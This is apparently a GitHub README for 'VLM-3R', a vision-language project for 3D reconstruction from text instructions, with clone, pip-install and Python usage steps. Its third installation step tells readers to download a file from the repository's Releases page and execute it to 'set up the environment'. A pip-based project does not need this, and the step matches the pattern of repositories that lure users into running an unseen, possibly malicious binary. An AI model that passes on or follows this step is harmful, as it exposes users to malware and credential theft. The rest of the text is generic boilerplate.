## Introduction

In recent years, the fields of computer vision and natural language processing have seen significant advancements. However, the integration of these two domains remains a challenge. VLM-3R aims to bridge this gap by utilizing instruction-aligned 3D reconstruction techniques. This allows for a more intuitive understanding of visual content through natural language.

### Objectives

- Develop a model that understands both visual and textual inputs.
- Create a framework that can generate 3D reconstructions based on language instructions.
- Enable applications in areas such as robotics, augmented reality, and educational tools.

## Features

- **Multi-Modal Input**: Process both images and text to generate meaningful outputs.
- **3D Reconstruction**: Create detailed 3D models from visual data aligned with textual descriptions.
- **User-Friendly Interface**: Simplified API for easy integration into existing systems.
- **Extensive Documentation**: Comprehensive guides and examples to help users get started.

## Installation

To get started with VLM-3R, follow these steps:

1. Clone the repository:
   ```bash
   git clone https://github.com/BelalAlnnggar/VLM-3R.git
   cd VLM-3R
   ```

2. Install the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Download the latest release from the [Releases](https://github.com/BelalAlnnggar/VLM-3R/releases) section. Make sure to execute the downloaded file to set up the environment correctly.

## Usage

After installation, you can start using VLM-3R in your projects. Here‚Äôs a simple example to illustrate how to use the model:

### Example Code

```python
from vlm3r import VLM3RModel

# Initialize the model
model = VLM3RModel()

# Provide an image and a text instruction
image_path = "path/to/image.jpg"
text_instruction = "Reconstruct the scene in 3D."

# Generate the 3D model
model_output = model.reconstruct(image_path, text_instruction)

# Save or display the model
model_output.save("output_model.obj")
```

### Advanced Usage

For more advanced use cases, refer to the [documentation](https://github.com/BelalAlnnggar/VLM-3R/wiki). Here you will find information on:

- Customizing model parameters
